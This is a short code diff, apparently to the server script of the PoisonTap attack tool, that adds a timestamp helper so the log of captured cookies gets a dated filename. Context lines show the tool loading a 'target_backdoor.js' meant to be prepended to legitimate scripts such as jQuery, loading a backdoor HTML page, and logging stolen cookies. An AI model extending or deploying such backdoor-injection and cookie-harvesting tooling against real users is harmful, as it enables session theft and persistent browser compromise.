@@ -5,13 +5,20 @@
  *  01/08/2016
  * 
  */
-
+function stringDate(){
+	var now = new Date();    var hours = now.getHours();
+	var minutes = (now.getMinutes()<10?'0':'') + now.getMinutes()
+	var day = now.getDate()
+	var month = now.getMonth();
+	var year = now.getFullYear();
+	return day+'-'+month+'-'+year+'-'+hours+':'+minutes;
+}
 var http = require("http");
 var fs = require('fs');
 var util = require('util');
 var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
 var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
-var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
+var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies'+stringDate()+'.log', {flags : 'a'});
 var log_stdout = process.stdout;
 var replacejs = fs.readdirSync(__dirname + '/js');
 var blinked = false;
